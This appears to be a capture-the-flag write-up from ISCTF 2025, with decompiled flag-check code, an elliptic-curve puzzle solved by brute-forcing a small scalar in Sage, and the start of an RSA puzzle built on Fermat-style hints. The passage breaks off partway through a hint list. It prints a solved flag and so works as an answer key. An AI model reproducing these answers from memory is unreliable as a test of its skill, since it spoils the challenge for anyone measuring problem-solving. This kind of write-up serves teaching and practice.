<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__m128i *__fastcall <span class="title function_">sub_36F4D1519</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rsi</span></span><br><span class="line">  __m128i *v3; <span class="comment">// rbx</span></span><br><span class="line">  __m128i *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">274</span>]; <span class="comment">// [rsp+26h] [rbp-132h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *Str; <span class="comment">// [rsp+138h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">"ISCTF2025"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)PyArg_ParseTuple(a2, &amp;unk_36F4D4000, &amp;Str) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = Str;</span><br><span class="line">  v3 = (__m128i *)Py_FalseStruct;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(Str) == <span class="number">25</span> )</span><br><span class="line">  {</span><br><span class="line">    v5 = (__m128i *)<span class="built_in">malloc</span>(<span class="number">0x19u</span>);</span><br><span class="line">    v3 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    {</span><br><span class="line">      *v5 = _mm_loadu_si128((<span class="type">const</span> __m128i *)v2);</span><br><span class="line">      *(__m128i *)((<span class="type">char</span> *)v5 + <span class="number">9</span>) = _mm_loadu_si128((<span class="type">const</span> __m128i *)(v2 + <span class="number">9</span>));</span><br><span class="line">      v6 = <span class="built_in">strlen</span>(v8);</span><br><span class="line">      sub_36F4D1430(&amp;v8[<span class="number">10</span>], v8, v6);</span><br><span class="line">      sub_36F4D149C(&amp;v8[<span class="number">10</span>], v3, <span class="number">25</span>);</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v3-&gt;m128i_i8[v7] == byte_36F4D4050[v7] )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( ++v7 == <span class="number">25</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">free</span>(v3);</span><br><span class="line">          <span class="keyword">return</span> (__m128i *)Py_TrueStruct;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="built_in">free</span>(v3);</span><br><span class="line">      <span class="keyword">return</span> (__m128i *)Py_FalseStruct;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      PyErr_NoMemory();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>在Hex试图可见</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000036F4D1520  01 00 00 48 89 D1 48 B8  49 53 43 54 46 32 30 32  ...H....ISCTF202</span><br><span class="line">000000036F4D1530  48 89 44 24 26 66 C7 44  24 2E 35 00 4C 8D 84 24  H.D$&amp;f..$.5.L..$</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251213161624559.png" alt=""></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h3><ul>
<li><p>沉迷数学的小蓝鲨</p>
<blockquote>
<p>小蓝鲨最近沉迷于椭圆曲线，但是有一个椭圆曲线问题它始终做不出来，据说它广泛应用于区块链技术。如果你可以帮助小蓝鲨解决这个问题，它将会给予你丰厚的报酬。</p>
<p>Hint1:你验证过基点 G 真的在曲线上吗？(这只是个ez题，别想太复杂）<br>Hint2:G是这条曲线上的冒牌货，但代数运算不在乎，因为计算机可不是数学家</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">y² = x³ + 3x + <span class="number">27</span> (mod p)</span><br><span class="line"></span><br><span class="line">Q(<span class="number">0xa61ae2f42348f8b84e4b8271ee8ce3f19d7760330ef6a5f6ec992430dccdc167</span>, <span class="number">0x8a3ceb15b94ee7c6ce435147f31ca8028d1dd07a986711966980f7de20490080</span>)</span><br><span class="line"></span><br><span class="line">k= ?</span><br><span class="line"></span><br><span class="line">最终flag请将解出k值的<span class="number">16</span>进制转换为<span class="number">32</span>位md5以ISCTF{}包裹提交</span><br></pre></td></tr></table></figure>
<p>信息过少，p，G都不知道，于是猜想是secp256k1固定参数</p>
<p>根据Hint1，b=27是假的，需要重新找到一个b’</p>
<p>k不大，<strong>在小范围内搜索才能跑的出来是关键</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># secp256k1 参数</span></span><br><span class="line">p = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line">Fp = GF(p)</span><br><span class="line"></span><br><span class="line">Gx = <span class="number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span></span><br><span class="line">Gy = <span class="number">0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</span></span><br><span class="line"></span><br><span class="line">Qx = <span class="number">0xa61ae2f42348f8b84e4b8271ee8ce3f19d7760330ef6a5f6ec992430dccdc167</span></span><br><span class="line">Qy = <span class="number">0x8a3ceb15b94ee7c6ce435147f31ca8028d1dd07a986711966980f7de20490080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于 G 不在 y² = x³ + 3x + 27 上，我们需要找到真正的 b</span></span><br><span class="line">b = (Fp(Gy)**<span class="number">2</span> - (Fp(Gx)**<span class="number">3</span> + <span class="number">3</span>*Fp(Gx)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"b = <span class="subst">{b}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建曲线</span></span><br><span class="line">E = EllipticCurve(Fp, [<span class="number">3</span>, b])</span><br><span class="line">G_pt = E(Gx, Gy)</span><br><span class="line">Q_pt = E(Qx, Qy)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查曲线阶</span></span><br><span class="line">order = E.order()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"阶分解: <span class="subst">{factor(order)}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于 k 不大，直接搜索小范围</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000000</span>):</span><br><span class="line">    <span class="keyword">if</span> k * G_pt == Q_pt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"找到 k = <span class="subst">{k}</span>"</span>)</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">k_hex = <span class="built_in">hex</span>(k)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"hex(k) = <span class="subst">{k_hex}</span>"</span>)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5(k_hex.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"\nFlag: ISCTF{{<span class="subst">{md5}</span>}}"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(sagemath) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/c/users/rekjo/desktop]</span><br><span class="line">└─# sage ecc.sage</span><br><span class="line">b = 66385389407800359838405813331870212727788158969948345552414605934650319155613</span><br><span class="line">阶分解: 2 * 3^2 * 7 * 53 * 4733 * 17669 * 42437 * 4885840951767371464006724254428399138698319915522809195449609</span><br><span class="line">找到 k = 954761</span><br><span class="line">hex(k) = e9189</span><br><span class="line"></span><br><span class="line">Flag: ISCTF{43896099feea21a3d5804863075e1aaa}</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{43896099feea21a3d5804863075e1aaa}</strong></p>
<ul>
<li><p>小蓝鲨的费马谜题</p>
<blockquote>
<p>小蓝鲨在一次网络探险中发现了一个神秘的加密系统。他发现这个系统好像使用了费马小定理来保护重要信息，但是又好像不太一样。小蓝鲨设法截获了系统的加密输出，但不知道如何解密，你可以帮帮它吗？</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">p = get_prime(<span class="number">1024</span>)</span><br><span class="line">q = get_prime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">bases = get_primes_up_to(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">hints = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bases)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(bases)):</span><br><span class="line">        hint_value = (<span class="built_in">pow</span>(bases[i], p-<span class="number">1</span>, n) + <span class="built_in">pow</span>(bases[j], p-<span class="number">1</span>, n)) % n</span><br><span class="line">        hints.append((bases[i], bases[j], hint_value))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">n = 16926747183730811445521182287631871095235807124637325096660759361996155369993998745638293862726267741890840654094794027600177564948819372030933079291097084177091863985749240756085243654442374722882507015343515827787141307909182820013354070321738405810257107651857739607060274549412692517140259717346170524920540888050323066988108836911975466603073034433831887208978130406742714302940264702874305095602623379177353873347208751721068498690917932776984190598143704567665475161453335629659200748786648288309401513856740323455946901312988841290917666732077747457081355853722832166331501779601157719722291598787710746917947</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 7135669888508993283998887257526185813831780208680788333332044930342125381561919830084088631920301623909949443002073193381401761901398826719665411432016217400457613545308262831975564456231165114091904748808206330488231569773162745696602366468753664188261933014198218922459715972876740957260132243927549037840265753282534565674280908439875550179801788711737901632349136780584007599655055605772651127003711138512998683145763743839326460319440186099818507078433271291685194944254795690424327192625258701835654639832285402990995662846426561789508331799972329711410217802657682842382105869446853207634070295959281375484933</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hints (format: base1, base2, hint_value):</span></span><br><span class="line"><span class="string">Hint 1: 11, 41, 403072318395713195475880235840306655046644537786837658466183670390322357403650602210882802453171853452</span></span><br><span class="line"><span class="string">Hint 2: 73, 7, 3401877351823051464833008106697922874740843547186522246399577691648145322938787488999079423405760696040635223407580102549819096176975820017380148265275786281647240647714533261221890310813882987089721138616513427711006945061727486708277298401545762448776593105730005387022319319199166969225690343981500127626848336242187816071435842118963634505746771844269484845077330851526393327015758760003053231670737896550596266539249975891234238005583184203089180325261872944167834576158878843510707348603774425827560724587546720860765943393963597645881666559247252842017499263265738255716811999328445725902262302532911214255949</span></span><br><span class="line"><span class="string">Hint 3: 59, 73, 695583691945177012011155613294846891840015729899504980764916686517371703553347581254163445300367305365949600797847620946823894152274689248119430670857791635723385692575931740078475490085973951317953049329486264578815530286784178680687403627415153526425715193114420845091853572366108176759184115038228886689580295865909953096284457818874267153151571968297454864850732608316298813594124020007025412733770104355236849081247730461956131749267446455113813284775308663385548094921945410215359273656658830019785099633226412843434625002115741084636776823289994271249660745143685585443820708578849162449717982725541307852715</span></span><br><span class="line"><span class="string">Hint 4: 53, 17, 971645701575323882519635342913625889703399294086</span></span><br><span class="line"><span class="string">Hint 5: 17, 53, 15015015166119321293244100074414416277924832658329700344653519929879563546652512240571777007009139132526751717913688831473249036114283479537249767699902565862566840754892319936718933957878788242522102884592375092063435348463420495622162622111752797419564087812071877456034189172928466087325995711799494559632348117577986369270044265839851198529901138826760234172452522279821372814789053868333623123766583799003287221335420456780264904184548645200345715153696373219687248029519611142514212181449677795769427641367964609639782220743835161725500332507591502818244881229659746207461229056486960160782643424330243354078694</span></span><br><span class="line"><span class="string">Hint 6: 59, 19, 4427802296687944448870952484227318</span></span><br><span class="line"><span class="string">Hint 7: 19, 43, 19174465169354813231681320402781559275699092043658101294284851123118510716279410</span></span><br><span class="line"><span class="string">Hint 8: 23, 31, 6031706827842456717715236244872427215835819411314168938820265741988730625387931647610750902952789928566569174296650515449892611198040938188209413722806254050103019879240215344570043498312370280623702924998835728624935413985841142180365335178468710734638030582183503463305813229510689954065159041592316788178873050291779739508108222965509434291492950189742558594400755699777715854046635146464467729949201239668741264832027750549876625288984575624485894153879412247669943493660233937543961086506015000295606199222800612415043850877838520358081044378561877650595040905680464898635661677396546195369907960492865630959945</span></span><br><span class="line"><span class="string">Hint 9: 73, 31, 14201978515584496685882877364621713654579319459919970854066889531106363038011334520524797899491133943665135480301300406440254472658620428164578914318059588912647092994632856690</span></span><br><span class="line"><span class="string">Hint 10: 31, 3, 17761887753093897979823770061456102763834352</span></span><br><span class="line"><span class="string">Hint 11: 13, 5, 4150700388609705807509972385476068337626559497757356803399419065000783917890225153250286903799441660433187538279583874523190497602462150199426414868861228792088666515397312761673326022980940385774334828394940770351447957541072690963220641780722897399543555486513918873014494692941882646929202605685305683969151271831603708612223260616432695010847067252877343217676963276876850265407927146383572955861063428706012170676831524971272198283920333900403902257748241220365118645448662797961778388544299359695919130547938351588261698392641490575786350259413542725944665834486513968924860904668074607650304874723425230270137</span></span><br><span class="line"><span class="string">Hint 12: 59, 53, 2093308535564899860358544644764036388478107502010763064242342417957960952425000274395405300689532194265342136032111944045432326085818281844400947666782274940461183395046865284971635536544260910022728631047126094710543502860882170401987674931187922422766222327719930375318976698721098197543008758760603140658147997152753438270623866111022164350986375651437321309108736011279113592001916870502347116720151257306071411569096876275005515839079136440506703094781753301521917670413306257490297241974169467740732230454155267623129991881695623072243477621355484939295049508367225410929080326109567111654067945546042372106278</span></span><br><span class="line"><span class="string">Hint 13: 11, 89, 5773679028890369456276328097218681131210336197851484718484213121094699090839722641329327818066934448088431288328288112007488949292271360565624555172295051667285077138864510745740214905953043079468933679191715551224964421931824712984605682049449568976492220103844351216496482668448767237697296740468431846671505265143619239976063901580555986558904470931013978569579237148514276178765419852198637961774494186181747458089405228411950572658310072067499489988259824774767508198451267875000556446298608250644009748818937568123418528009187811944967998576518784004540892824519032050506460017670585483238226301820712571645579</span></span><br><span class="line"><span class="string">Hint 14: 59, 19, 10974757986236006288348468568336947121923978268025782618680419380484847824293845383379274809628633982884248524866285416869994466804493799071019695089232140692475376148645650118342055726520583120333882910989811592931370723715884717392658914626279560914541425986351478710240862377226197891323537525676367683258652280225895980668977840969537035757009985713502197856706880646989184201990423727195172560560704893733494792945340405983958264929760613990510042281137251536502371683060105493456566203202995676363796508260438545252515574493473542492715179349497866152824132141129238032807684278789579870873990631709515352502373</span></span><br><span class="line"><span class="string">Hint 15: 11, 59, 8286765915642893643722267671556930668422080363489440619486004330134849571178036674986475802754804260626759450923775241201472288503107728483612582960417838690160802</span></span><br><span class="line"><span class="string">Hint 16: 3, 83, 8670564904343374156075891784422797917915847070310520984332279769504164524019002920437878667712734918407503893528964609388615752378009668179394550543334742880513288696193899579334352041612737521648871122300770732109991958777364103317237896209222739571605930423722098331428587046952745581887767018125449661836385756401767146216848185513274686419811084754784129338190887685792489185844961970682436930953762662159256843649680197802836233628748219421311091068027884246286801955132580168006746385788553263325371239064547214943270463799271582693307097866515323559640081377472410365311796667103389327125755510398234792960539</span></span><br><span class="line"><span class="string">Hint 17: 47, 71, 15189655529337297599070621327692775647472437654342284733419279459044091245709484592008784236836038238199431339530080798833863694019082099360867975411468181802365883838048650755521947739185044832121750278668725458779161264572106488221158049174704002405104694045711051726668876267794954827804265584531526809688162851528267958117474561865081871142026481602702358611977383838840467216409782013973906761226139903245114056975231832568083538564658843330419770362826462102622789108069389249602641189148715388059622341376715417265924644704691316367196722599195793773962428198040205512616444509750834973953022693785550802266112</span></span><br><span class="line"><span class="string">Hint 18: 19, 29, 14661046810005357468594301664850836437610256328712330874381003343699942748425302158171105550644727048051206458117828772075144383589551129619743654527620413132286889305278690645291359466534057249273843187124449541437587033949823571613090619667989912739101162245067852658322665279694710401800444138141346856093835079283227374648099624120782619771322472623630789096431414534527222485118949515372622085183912510018177895906649522504991475861146404995703763107816964209369487501529056212864220862713277632632268594192926804994930950930762255940853728034617285828125545163750399143037606327606535126251763073693473953686744</span></span><br><span class="line"><span class="string">Hint 19: 11, 89, 13357214564583644951510034650716277516325510600111365531856471059002907497767937445827192806732793166523983315887101899445087845542550038342480500237151465231405685422545530090065005109607310864977025325103465672450850540379234341279749113886947539400845321822481006994262700375964062063857363515290494376286961284725864589465065587339836635723085250544188242927462327068925005089561746960078398647971113589281563663689024296134195815738058179266887469473137997216792436310641839801585271790331365746442208348676200753457562160444740691258422882276851839616144554731981681550535123108350101531030525324694963994545288</span></span><br><span class="line"><span class="string">Hint 20: 13, 19, 9015439113692415723812039454602636203717179069784080604236209577969030957184510380132987544909218798262905505307236620420364723156896628015021747981816896133290154232921264396063118665954041870382404950626337554885082880595372492300185559547705412727112020773895391734178675568118417294113429562448849544338564697858353479059676992341239979279973948191000090925611122966827392226766571948922617345703402518639464697367975459916964712370264229447747875703346922955116402649868815187647332682627727429521327349380558524025434437065348919358179886784373948470464530596295968257196117932806673623409596232224263656709447</span></span><br><span class="line"><span class="string">Hint 21: 17, 89, 1232624071183606371752171179827692250773859330394635710762162149851456772281037111827897119725547063233395640472176481922500789994068941245743063373416785659254352015310032922118348550975562</span></span><br><span class="line"><span class="string">Hint 22: 67, 83, 1126066176169173986258375138688137558142264839106063302940880092042502490911057016254959754435510429411384392032847908273635563612047472121950839934733905729015943917767915064618640585969621038467420076188953203812632416692873236731402216410500667938438399832227071790611412372173974174687603713326333791754140419675029772154828193139783484205710539042656417324250808919494712510406268629862104562237889399268931862879343990757365436458551497886263701914349819002099339457690106946122543529626710290881457346334759953170142024757161589525394691005814751979092184245953191693247075620270045838678527511170972567753351</span></span><br><span class="line"><span class="string">Hint 23: 41, 97, 15061728396574720128871454281806425283902878531290205263072044930084328354647716799950058691868870125292816458036423472349601649870044904984377004711678761714808846252355372756850495640148784156530292575757175420916873271609977179541391067607437946628688811886889502712607514447458904992024279765998865875618672417318528806259694052202283848620150531327490085874935926140164888318138777816635210686133434879564761574366090585467327313351792501721900090022412568322566880308204689579089754113916523137219409702840025596606460438071507115794360457519041650146002247978792944063933568992230154174930543323173071240960636</span></span><br><span class="line"><span class="string">Hint 24: 7, 23, 107006904423598033367949136709476534616</span></span><br><span class="line"><span class="string">Hint 25: 79, 47, 11094334665560612802457947914579705831928780165312070004861180761238832002874428458670163845939464475999733253092738012391076484871479088986479536610030564639805718143084622127711215172458485326388902083413575454799106868355391943732802994224342313418146481622340282330554260946195940723120836406549666330792363893799020720281135898034922255022048435484533585962047978284629786026663018345757890693521562666203031553493103945295693195640052093415731503407816366337336182698796883001653465915740746118519384260984893835094879165736186434278489286286227662273545663256993867922180157248380291757381125272120891684062194</span></span><br><span class="line"><span class="string">Hint 26: 59, 73, 4064264878148785166802093462858575465400091342645180541176126645875623098033551060982695656331190143572426766578696362147717218779335361493125256534627342192680373626652482508115615860816250319187188097915962706304133850035098343668277834974105321147191342624944627482006284223163704828843061145141268544104282644658022010819808655796239544272048394743182820455393255285941665799519906799024432739271653191031181064778284104887384076188431552852025837101339257686236262365247791750207700069395619856622961279534162976795147959769683692604340368460731405668330115156114576764572051491629821619308816381773343755003534</span></span><br><span class="line"><span class="string">Hint 27: 67, 37, 13951782965760049234481961368802553800278133941697263631552649243302664977209715848353709633491008434674270268090076527067844931388512019333805006404853566312201157392447713057698715800623288234051899693554210937852453814575305705182660789018065999222430838475037429354174069134372859946362529872754325135924297601113491133129277121309644377255711296412090554983403167436585565758988120192517511808267055408632606896756685326534561420410005038161122481109870042764517919065341900975187982359357007105413042469550052322588976438466403370644683889314221651454587673986716491269580073476431119104550125907982617819198239</span></span><br><span class="line"><span class="string">Hint 28: 71, 31, 14592451107942406172703460352000704126425716661469483183610425663886284772375260143470595014699236417504356417924516247683378564032172689094243907515271202472795378941272772693424353756938883720892780719870429492112844354792067076527090697208293397879373413452057503440196643066732299886678533556377726500394447831070628632364135576812382061688937462189566815186722078015421531935330987991868677259308976254080329342447669466494877857082494259824027412023017042305976083947770306599290459206333751309651343338718031684134413354721116695889173022783305688553309591139544114673672159391172663588390812561345603404875445</span></span><br><span class="line"><span class="string">Hint 29: 61, 37, 150312118586919145020616357224172487248862369450901081305248777087453651799298780184965167114015639778324633934952775965666791061680751287444693564273797597220185626300049938</span></span><br><span class="line"><span class="string">Hint 30: 47, 89, 5435525789990781146665058968159824543197878249058619814486157180575648579639831493916004219973973832266296536703517577992770</span></span><br><span class="line"><span class="string">Hint 31: 23, 47, 16103071775810171711924674905790805963818714309292465098237116772593040021211622298924186932004880334851627830206994635151992140064405277570483377357957039009351094902151630023493150975576584876244834021621269645929479405478143057020268612485343670663377970673925984030126760947109176763636955974818654880191024493408598053751276065135442200582652319408920748644591450674320233708025358524648197707659990862662361862539842868417063320792767415984991601751165223638123837341091365974671765054733794332399697028713963544373254318631595083356458002718583341127602790857490164278343070475882464426640213476914415482369850</span></span><br><span class="line"><span class="string">Hint 32: 29, 5, 13149325842021723251134510511729784479095642778506166091034934686556554381120350749714138697288609601129918017821541343485285067285202422145639363694603240119439803374916552440509169187395808575353190466385753062164445875730603626277916455911345416839502129509688066724158296752117066013823226052016786749548019509350864881585069802037870118674424466298682508091272797804735861773714128160193020313575834557745724129735757517340056227714959610755715392915985854554070909168057367535004631491240072926342019254725105436116655974774609052713231818128446311960013765270122065871739363402131985754839033491581530499347992</span></span><br><span class="line"><span class="string">Hint 33: 89, 47, 630043523370452187379224662747648830902214688021486477430843243593080113724992705480996062907676256037302619160067814028518895461989971281884155808829193898017336</span></span><br><span class="line"><span class="string">Hint 34: 19, 59, 5312300113767710347282768227082829679387523215214639151760217349511385597102767288546324009076948101196442028352053632460946433171294574346446379257281949909272350819311609431501573807000878460778313626108872598317920103278246614995180550162481588759079785633301645095994306260526442257399195256822168763040046685053639779110740308012206330181637380011462498603874585251040951562533555627840386291011622732627801692079226133918094516784934996032323522126557227339640405344352939596441336679652918394074410690904621730980459695004938137633444530118011543020946033976566969594506053598637256025269420788063085529221486</span></span><br><span class="line"><span class="string">Hint 35: 59, 3, 13338480097536050870847065134681408887393061870891194580910295898171005379071202538125320488322264936939611934926773854147441861842696082224910493485968940453414962504999277326912024770737526865763322593711772391102570024742439366641421857370464779798305027785021436688758138471130400190763565033556147205447698037378616533728663507465789889356211004747849498360714349678453175418183091908832867382402195272783569030789904261178845317149753713695808383033170623145131434242158410724256492198680651336056844232593215970896169424430059260906555229446741538286239350780216208715553935143523165464773688871774009588738407</span></span><br><span class="line"><span class="string">Hint 36: 67, 2, 8256928556897492704838762552986750294374712035464071847912955091323033935694693535736594865997626239305042785518308139569682623007419575794366667620985270619928978345775201291927479777879409352040290541010779775363393802966114845982777093715738330158248145557248971011553853095404328553837691636026735523457849132602891079774484964955413419103753159331087739019434888120001297351898315190776895144785024767468167340726846414096469818750219466508467856583779003457862584610836846910059997868710036273917335512342095635575374346404071250572917845292452258621324256922950179010754476790644241744968537946791784277331172</span></span><br><span class="line"><span class="string">Hint 37: 11, 89, 469829525495433863398701036274262995240821686827512278740409156383771339857992568557981522</span></span><br><span class="line"><span class="string">Hint 38: 53, 17, 15381013223078846537731461466880636394199540595403435401138127547481863401431466372374802606225281410197388364722944495843405467862781503434970989158584650159590980399087359088118746163629618532987297413548047215179053477589410157484215376788161320381404390190467326828317085039705167675630596365709188985681649747552770255068423205419746730136649403555515290098619746175600947097893366036430479763751257652595334352418296864541247999321025232348500763810371215286305853572498789766256531460974011022731922336715523379552064525311328532274496963226072015892784253991084576242734695083889820166631064731394426574244137</span></span><br><span class="line"><span class="string">Hint 39: 59, 3, 8639902842024035953048638563768315927624671856924547112209526883962456853052089935252707927468432895933170836045185383394096573378220873632433306851623471094895240704466661122788392467144892335530991171751297377896525529639348516066396938968040587426508605861054726429454030686327018745441753930983556245291730653368996527050046737903050080495173995563726990564829713815768651787483101363848070083858443766098560638337868296111441788798574965477355431173836128839250967090465226610709666720508328978510631834435136772497463531551713080290889081436462800389414847971067210139076388894646477223534324245688231308651402</span></span><br><span class="line"><span class="string">Hint 40: 71, 2, 35228394523315997738820412922291535639435039748226420541446858967158850258697393757215146296389518178994242807247547892971367759083443187781159</span></span><br><span class="line"><span class="string">Hint 41: 71, 89, 6240983929786483220051416467719053988488038641934890929981073832233939427834145472336915358758745943895354212032680367743535480193473825955326802869864352912264819240397323037315537988324410288546472301626890591739573348191915387074878814318018257079325106269383242877918486075024690767741729879076813581842036944498326059102754583317760100647490256432861228914984872474683425397073112462956198249407553140398404673370857128292911829788563089759423977978816627360219756198454057710015406165962422617662704219899517474510659197047034325834333381214858621450033089047323717051044225354940003754145032127292424992011101</span></span><br><span 